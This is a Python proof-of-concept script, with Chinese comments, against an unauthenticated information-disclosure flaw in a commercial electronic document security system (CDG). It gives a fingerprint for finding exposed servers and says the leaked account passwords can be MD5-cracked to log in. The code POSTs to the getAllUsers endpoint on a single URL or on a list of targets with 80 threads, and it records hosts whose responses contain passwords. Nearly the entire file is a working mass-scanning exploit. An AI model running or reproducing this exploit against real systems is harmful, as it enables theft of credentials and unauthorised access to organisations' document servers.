# -*- coding: utf-8 -*-
# 某赛通电子文档安全管理系统 getAllUsers 信息泄露漏洞
# body="/CDGServer3/index.jsp"
# 产品简介:某赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。
# 漏洞概述:某赛通电子文档安全管理系统 /CDGServer3/openapi/getAllUsers 接口处存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取后台账号密码等敏感信息，进一步MD5解密即可登录后台，使系统处于极不安全的状态。

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
                \x1b[38m██╗   ██╗███████╗       ██████╗██████╗  ██████╗ 
                \x1b[36m╚██╗ ██╔╝██╔════╝      ██╔════╝██╔══██╗██╔════╝ 
                \x1b[34m ╚████╔╝ ███████╗█████╗██║     ██║  ██║██║  ███╗
                \x1b[35m  ╚██╔╝  ╚════██║╚════╝██║     ██║  ██║██║   ██║
                \x1b[31m   ██║   ███████║      ╚██████╗██████╔╝╚██████╔╝
                \x1b[33m   ╚═╝   ╚══════╝       ╚═════╝╚═════╝  ╚═════╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    --author:Kucei  --Version:某赛通电子文档安全管理系统 getAllUsers 信息泄露漏洞
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('某赛通电子文档安全管理系统 getAllUsers 信息泄露漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = "/CDGServer3/openapi/getAllUsers"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    data = "pageSize=10000&pageNumber=1"
    try :
        response = requests.post(url=target+url_payload,headers=headers,verify=False,data=data,timeout=7)
        # print(response.status_code)
        # print(response.text)
        if response.status_code == 200 and 'password' in response.text:
            print( f"[+] {target} 存在漏洞！\n")
            with open('YS-CDG_getAllUsers信息泄露漏洞.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")

if __name__ == '__main__':
    main()